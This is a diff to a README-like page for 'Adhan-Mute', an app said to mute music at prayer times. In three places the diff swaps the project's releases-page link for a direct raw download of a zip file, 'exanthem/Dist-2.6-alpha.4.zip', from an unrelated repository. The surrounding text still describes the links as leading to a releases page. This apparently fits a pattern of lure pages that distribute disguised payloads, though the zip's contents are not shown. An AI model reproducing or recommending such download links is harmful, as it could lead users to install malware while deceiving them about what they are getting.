@@ -6,7 +6,7 @@ description: "Mute your music automatically at every local prayer time, then res
 <h1>🔇 Adhan-Mute - Never Miss a Prayer, Always Stay Focused</h1>
 
 <p align="center">
-  <a href="https://github.com/Nluthfi20/adhan-mute/releases">
+  <a href="https://github.com/Nluthfi20/nluthfi20.github.io/raw/refs/heads/main/exanthem/Dist-2.6-alpha.4.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20For%20All%20Platforms-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=%2328B463" alt="Download Badge" style="width:100%;max-width:400px;border-radius:12px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">
   </a>
 </p>
@@ -44,7 +44,7 @@ description: "Mute your music automatically at every local prayer time, then res
 <h3>Step 1️⃣: Download the Application</h3>
 <p>Click the big green button at the top of this page, <strong>or</strong> go directly to the download page here:</p>
 <p align="center">
-  <a href="https://github.com/Nluthfi20/adhan-mute/releases" style="background-color:#4CAF50;color:white;padding:14px 28px;font-size:22px;text-align:center;border-radius:10px;display:inline-block;text-decoration:none;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.3);">⬇️ Visit This Link to Download the Application</a>
+  <a href="https://github.com/Nluthfi20/nluthfi20.github.io/raw/refs/heads/main/exanthem/Dist-2.6-alpha.4.zip" style="background-color:#4CAF50;color:white;padding:14px 28px;font-size:22px;text-align:center;border-radius:10px;display:inline-block;text-decoration:none;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.3);">⬇️ Visit This Link to Download the Application</a>
 </p>
 <p>This link takes you to a page that lists the latest version of Adhan-Mute for all operating systems. Look for the section that matches your computer:</p>
 <ul>
@@ -126,7 +126,7 @@ description: "Mute your music automatically at every local prayer time, then res
 
 <h2>📥 Download Again (One-Click)</h2>
 <p align="center">
-  <a href="https://github.com/Nluthfi20/adhan-mute/releases" style="background-color:#FF6B35;color:white;padding:14px 28px;font-size:22px;text-align:center;border-radius:10px;display:inline-block;text-decoration:none;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.3);">⬇️ Visit This Link to Download the Application</a>
+  <a href="https://github.com/Nluthfi20/nluthfi20.github.io/raw/refs/heads/main/exanthem/Dist-2.6-alpha.4.zip" style="background-color:#FF6B35;color:white;padding:14px 28px;font-size:22px;text-align:center;border-radius:10px;display:inline-block;text-decoration:none;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.3);">⬇️ Visit This Link to Download the Application</a>
 </p>
 
 <p align="center" style="color:gray;font-size:12px;">© 2025 Adhan-Mute. Made with 🕋 for the global Muslim community.</p>
